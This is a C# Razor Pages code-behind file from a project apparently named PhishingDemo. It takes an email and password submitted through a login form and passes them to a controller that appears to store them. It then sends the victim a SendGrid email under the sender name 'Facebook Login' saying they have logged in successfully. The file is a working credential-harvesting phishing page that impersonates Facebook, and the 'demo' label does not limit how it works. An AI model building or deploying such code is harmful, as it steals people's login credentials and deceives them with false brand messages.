using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using SendGrid;
using SendGrid.Helpers.Mail; // Required for SendGrid message creation
using System;
using System.Threading.Tasks;
using PhishingDemo.Controller;
using Microsoft.Extensions.Configuration;

namespace PhishingDemo.Pages
{
    public class IndexModel : PageModel
    {
        private readonly IConfiguration _configuration;
        public IndexModel(IConfiguration configuration)
        {
            _configuration = configuration;
        }

        [BindProperty]
        public string Email { get; set; } = string.Empty;
        [BindProperty]
        public string Password { get; set; } = string.Empty;

        public void OnGet()
        {
        }

        public async Task OnPostAsync()
        {
            BCS controlls = new BCS();
            controlls.AddUser(Email, Password);

            // Call method to send email
            await SendLoginEmailAsync(Email);
        }

        // Method to send email
        private async Task SendLoginEmailAsync(string userEmail)
        {
            try
            {
                var apiKey = _configuration["SendGridApiKey"];
                var client = new SendGridClient(apiKey);

                var message = new SendGridMessage
                {
                    From = new EmailAddress("ekwomnick@gmail.com", "Facebook Login"),
                    Subject = "Login Notification",
                    PlainTextContent = "You have successfully logged in!",
                    HtmlContent = "<strong>You have successfully logged in!</strong>"
                };
                message.AddTo(new EmailAddress(userEmail));

                // Send the email
                var response = await client.SendEmailAsync(message);
                if (response.StatusCode != System.Net.HttpStatusCode.OK &&
                    response.StatusCode != System.Net.HttpStatusCode.Accepted)
                {
                    throw new Exception($"Failed to send email. Status code: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                // Handle any exceptions, e.g., logging
                Console.WriteLine($"Error sending email: {ex.Message}");
            }
        }
    }
}
